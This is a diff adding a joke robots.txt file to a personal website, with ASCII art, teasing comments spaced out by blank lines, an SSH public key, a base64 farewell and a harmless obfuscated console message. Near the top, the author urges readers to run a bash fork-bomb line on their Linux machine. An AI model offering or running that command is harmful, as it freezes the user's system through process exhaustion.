@@ -1,0 +1,412 @@
+#                               ▄▄           ██                                  
+#                       ██      ██           ▀▀                                  
+# ██▄████▄   ▄████▄   ███████   ██▄████▄   ████     ██▄████▄   ▄███▄██           
+# ██▀   ██  ██▀  ▀██    ██      ██▀   ██     ██     ██▀   ██  ██▀  ▀██           
+# ██    ██  ██    ██    ██      ██    ██     ██     ██    ██  ██    ██           
+# ██    ██  ▀██▄▄██▀    ██▄▄▄   ██    ██  ▄▄▄██▄▄▄  ██    ██  ▀██▄▄███           
+# ▀▀    ▀▀    ▀▀▀▀       ▀▀▀▀   ▀▀    ▀▀  ▀▀▀▀▀▀▀▀  ▀▀    ▀▀   ▄▀▀▀ ██           
+#                                                              ▀████▀▀           
+#                                                                                
+#                                                                                
+# ▄▄                                                                             
+# ██                                                                             
+# ██▄████▄   ▄████▄    ██▄████   ▄████▄                                          
+# ██▀   ██  ██▄▄▄▄██   ██▀      ██▄▄▄▄██                                         
+# ██    ██  ██▀▀▀▀▀▀   ██       ██▀▀▀▀▀▀                                         
+# ██    ██  ▀██▄▄▄▄█   ██       ▀██▄▄▄▄█     ██                                  
+# ▀▀    ▀▀    ▀▀▀▀▀    ▀▀         ▀▀▀▀▀      ██                                  
+#                                           ▀▀      
+#
+# ▄▄                                                   ██                        
+# ██                    ██                             ▀▀                        
+# ██▄███▄   ██    ██  ███████             ██▄████▄   ████      ▄█████▄   ▄████▄  
+# ██▀  ▀██  ██    ██    ██                ██▀   ██     ██     ██▀    ▀  ██▄▄▄▄██ 
+# ██    ██  ██    ██    ██                ██    ██     ██     ██        ██▀▀▀▀▀▀ 
+# ███▄▄██▀  ██▄▄▄███    ██▄▄▄             ██    ██  ▄▄▄██▄▄▄  ▀██▄▄▄▄█  ▀██▄▄▄▄█ 
+# ▀▀ ▀▀▀     ▀▀▀▀ ▀▀     ▀▀▀▀             ▀▀    ▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀▀     ▀▀▀▀▀  
+#                                                                                
+#                                                                                
+#                                                                                
+#                                  ▄▄                                  
+#   ██                             ██                                  
+# ███████    ██▄████  ▀██  ███     ██                                  
+#   ██       ██▀       ██▄ ██      ██                                  
+#   ██       ██         ████▀      ▀▀                                  
+#   ██▄▄▄    ██          ███       ▄▄                                  
+#    ▀▀▀▀    ▀▀          ██        ▀▀                                  
+#                      ███                                             
+#
+# This isn't a CTF challenge...                                                                                            
+# If you really wanna play a CTF though, check out https://ctftime.org/.
+# While you're still here, try out this command on your linux machine (at your own risk) ;) :-
+# :(){ :|:& }:
+
+User-agent: *
+Disallow:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Why are you still here?
+# Okay here's my public key if that's what you're looking for...
+# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBl+FehLpTST6+tpomP4sBs+zzO1SJ3d3Cn5Ns2MqfZ4lq+cUmbXLpJb/uGeKXR1vHkLagakIv70/By0bZ7nRQK3JRIAI0PEwtQHXzOcO0NcE+ewRaQNDhKrJjJqOE180trfLqIcEqekfocOXa/4ygbnLJrkth0Hq+7r0eBR1mXI00ZRNC1oz13+xqNGml9z/mUd+rzf/y4JtMcLByn02Q28BjYIJBvMXxxcpkW8qloLHmuBWCqYwFqvMW76e+Rwk9S+hUAiBYD10/TkuE1GepVSlCmJr8JSLuT9akXP4Y3ndJS1dJ+q5iB8tOC2TaQ3pK0rZtbjOFOtOnbhPX4BO7RQD7v7kNrcGe6dhJi1eqt27ryGkYx2QODWUgy9Wx6qm+36pNc5uwvuIReogooHMlWn18l88H0pw7tS6ePFp/QsYT8p6crjkZOYB7/rWrBrEkb0rk6CAGSfJMVp6E/f0Srnb5Fwhcj2j0fgy7wGtQ2D35enUgspsOx3AnjZU77JM= roerohan@anarchy
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Okay seriously, go away. There's nothing here.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# You really are stubborn.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# What a stalker...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+var _0x2af4=['\x6c\x6f\x67','\x25\x63\x47\x4f\x20\x25\x63\x41\x57\x41','\x63\x6f\x6c\x6f\x72\x3a\x20\x67\x72\x65'];(function(_0x1daeb8,_0x2af46f){var _0x2df290=function(_0x3012cf){while(--_0x3012cf){_0x1daeb8['push'](_0x1daeb8['shift']());}};_0x2df290(++_0x2af46f);}(_0x2af4,0xe0));var _0x2df2=function(_0x1daeb8,_0x2af46f){_0x1daeb8=_0x1daeb8-0x0;var _0x2df290=_0x2af4[_0x1daeb8];return _0x2df290;};function a(){console[_0x2df2('\x30\x78\x31')](_0x2df2('\x30\x78\x32')+'\x59','\x63\x6f\x6c\x6f\x72\x3a\x20\x72\x65\x64',_0x2df2('\x30\x78\x30')+'\x65\x6e');}a();
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+T2theSwgYnllLgo=
